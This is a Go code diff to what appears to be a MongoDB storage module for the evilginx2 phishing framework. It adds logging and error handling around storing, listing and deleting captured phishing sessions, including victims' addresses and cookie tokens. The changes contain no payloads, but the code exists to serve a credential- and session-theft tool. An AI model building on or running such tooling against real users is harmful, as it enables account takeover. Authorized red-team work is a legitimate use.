@@ -3,9 +3,10 @@ package database
 import (
 	"context"
 	"fmt"
-	"log"
 	"time"
 
+	"github.com/kgretzky/evilginx2/log"
+	
 	"go.mongodb.org/mongo-driver/bson"
 	"go.mongodb.org/mongo-driver/bson/primitive"
 	"go.mongodb.org/mongo-driver/mongo"
@@ -42,25 +43,38 @@ type MongoSession struct {
 
 // NewMongoDatabase ينشئ اتصالًا جديدًا بقاعدة بيانات MongoDB
 func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
-	log.Printf("إنشاء اتصال MongoDB جديد: %s", mongoURI)
+	log.Info("محاولة الاتصال بـ MongoDB على: %s (قاعدة البيانات: %s)", mongoURI, dbName)
 
+	// سيستمر العملية إذا فشل الاتصال (10 ثوان)
 	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-	client, err := mongo.Connect(ctx, options.Client().ApplyURI(mongoURI))
+	
+	// إنشاء خيارات العميل
+	clientOptions := options.Client().ApplyURI(mongoURI)
+	
+	// محاولة الاتصال
+	log.Debug("[MongoDB] بدء الاتصال...")
+	client, err := mongo.Connect(ctx, clientOptions)
 	if err != nil {
 		cancel()
 		return nil, fmt.Errorf("فشل الاتصال بـ MongoDB: %v", err)
 	}
 
 	// التحقق من الاتصال
-	if err := client.Ping(ctx, nil); err != nil {
+	log.Debug("[MongoDB] اختبار الاتصال...")
+	pingCtx, cancelPing := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancelPing()
+	
+	if err := client.Ping(pingCtx, nil); err != nil {
 		cancel()
 		return nil, fmt.Errorf("فشل اختبار اتصال MongoDB: %v", err)
 	}
+	log.Info("تم الاتصال بـ MongoDB بنجاح!")
 
 	db := client.Database(dbName)
 	sessionsColl := db.Collection("sessions")
-
-	// إنشاء فهرس على حقل SessionId
+	
+	// إنشاء فهرس على حقل SessionId للبحث السريع
+	log.Debug("[MongoDB] إنشاء فهرس على حقل SessionId...")
 	_, err = sessionsColl.Indexes().CreateOne(ctx, mongo.IndexModel{
 		Keys:    bson.D{{Key: "session_id", Value: 1}},
 		Options: options.Index().SetUnique(true),
@@ -69,12 +83,21 @@ func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
 		cancel()
 		return nil, fmt.Errorf("فشل إنشاء الفهرس: %v", err)
 	}
+	log.Debug("[MongoDB] تم إنشاء الفهرس بنجاح")
+	
+	// عد عدد الجلسات الموجودة
+	count, err := sessionsColl.CountDocuments(ctx, bson.M{})
+	if err != nil {
+		log.Error("[MongoDB] فشل عد الجلسات: %v", err)
+	} else {
+		log.Info("تم العثور على %d جلسة موجودة في MongoDB", count)
+	}
 
 	return &MongoDatabase{
 		client:       client,
 		db:           db,
 		sessionsColl: sessionsColl,
-		ctx:          ctx,
+		ctx:          context.Background(), // استخدام سياق دائم بدلاً من السياق المحدود بمهلة
 		cancel:       cancel,
 	}, nil
 }
@@ -184,30 +207,39 @@ func (m *MongoDatabase) GetLastSessionId() (int, error) {
 	err := m.sessionsColl.FindOne(m.ctx, bson.D{}, opts).Decode(&session)
 	if err != nil {
 		if err == mongo.ErrNoDocuments {
+			log.Debug("[MongoDB] لم يتم العثور على جلسات، سيتم إنشاء أول جلسة بمعرف 1")
 			return 0, nil
 		}
+		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف جلسة: %v", err)
 		return 0, err
 	}
+	log.Debug("[MongoDB] آخر معرف جلسة: %d", session.Id)
 	return session.Id, nil
 }
 
 // CreateSession ينشئ جلسة جديدة في MongoDB
 func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remoteAddr string) error {
+	log.Debug("[MongoDB] محاولة إنشاء جلسة جديدة: %s", sid)
+	
 	// التحقق مما إذا كانت الجلسة موجودة بالفعل
 	var existingSession MongoSession
 	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&existingSession)
 	if err == nil {
+		log.Debug("[MongoDB] الجلسة موجودة بالفعل: %s", sid)
 		return fmt.Errorf("الجلسة موجودة بالفعل: %s", sid)
 	} else if err != mongo.ErrNoDocuments {
+		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
 		return err
 	}
 
 	// الحصول على آخر معرف
 	lastId, err := m.GetLastSessionId()
 	if err != nil {
+		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف: %v", err)
 		return err
 	}
 	newId := lastId + 1
+	log.Debug("[MongoDB] تعيين معرف الجلسة الجديدة: %d", newId)
 
 	// إنشاء جلسة جديدة
 	now := time.Now().UTC().Unix()
@@ -229,19 +261,29 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 	}
 
 	_, err = m.sessionsColl.InsertOne(m.ctx, newSession)
-	return err
+	if err != nil {
+		log.Error("[MongoDB] خطأ أثناء إدراج الجلسة: %v", err)
+		return err
+	}
+	
+	log.Debug("[MongoDB] تم إنشاء الجلسة بنجاح: %s (ID: %d)", sid, newId)
+	return nil
 }
 
 // ListSessions يجلب قائمة الجلسات من MongoDB
 func (m *MongoDatabase) ListSessions() ([]*Session, error) {
+	log.Debug("[MongoDB] جلب قائمة جميع الجلسات")
+	
 	cursor, err := m.sessionsColl.Find(m.ctx, bson.M{})
 	if err != nil {
+		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسات: %v", err)
 		return nil, err
 	}
 	defer cursor.Close(m.ctx)
 
 	var mongoSessions []MongoSession
 	if err := cursor.All(m.ctx, &mongoSessions); err != nil {
+		log.Error("[MongoDB] خطأ أثناء فك ترميز الجلسات: %v", err)
 		return nil, err
 	}
 
@@ -250,6 +292,7 @@ func (m *MongoDatabase) ListSessions() ([]*Session, error) {
 		sessions = append(sessions, convertFromMongoSession(&mongoSessions[i]))
 	}
 
+	log.Debug("[MongoDB] تم العثور على %d جلسة", len(sessions))
 	return sessions, nil
 }
 
@@ -269,15 +312,20 @@ func (m *MongoDatabase) GetSessionById(id int) (*Session, error) {
 
 // GetSessionBySid يجلب جلسة من MongoDB باستخدام معرف الجلسة
 func (m *MongoDatabase) GetSessionBySid(sid string) (*Session, error) {
+	log.Debug("[MongoDB] البحث عن الجلسة بواسطة SID: %s", sid)
+	
 	var mongoSession MongoSession
 	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&mongoSession)
 	if err != nil {
 		if err == mongo.ErrNoDocuments {
+			log.Debug("[MongoDB] الجلسة غير موجودة: %s", sid)
 			return nil, fmt.Errorf("الجلسة غير موجودة: %s", sid)
 		}
+		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
 		return nil, err
 	}
-
+	
+	log.Debug("[MongoDB] تم العثور على الجلسة: %s (ID: %d)", sid, mongoSession.Id)
 	return convertFromMongoSession(&mongoSession), nil
 }
 
@@ -372,10 +420,23 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 	return err
 }
 
-// DeleteSession يحذف جلسة من MongoDB باستخدام المعرف العددي
+// DeleteSessionById يحذف جلسة باستخدام المعرف العددي
 func (m *MongoDatabase) DeleteSessionById(id int) error {
-	_, err := m.sessionsColl.DeleteOne(m.ctx, bson.M{"id": id})
-	return err
+	log.Debug("[MongoDB] محاولة حذف الجلسة بالمعرف العددي: %d", id)
+	
+	result, err := m.sessionsColl.DeleteOne(m.ctx, bson.M{"id": id})
+	if err != nil {
+		log.Error("[MongoDB] خطأ أثناء حذف الجلسة بالمعرف %d: %v", id, err)
+		return err
+	}
+	
+	if result.DeletedCount == 0 {
+		log.Debug("[MongoDB] لم يتم حذف أي جلسة، ربما لم يتم العثور على جلسة بالمعرف %d", id)
+		return fmt.Errorf("لم يتم العثور على جلسة بالمعرف: %d", id)
+	}
+	
+	log.Debug("[MongoDB] تم حذف الجلسة بالمعرف %d بنجاح", id)
+	return nil
 }
 
 // DeleteSession يحذف جلسة باستخدام معرف الجلسة (sid)
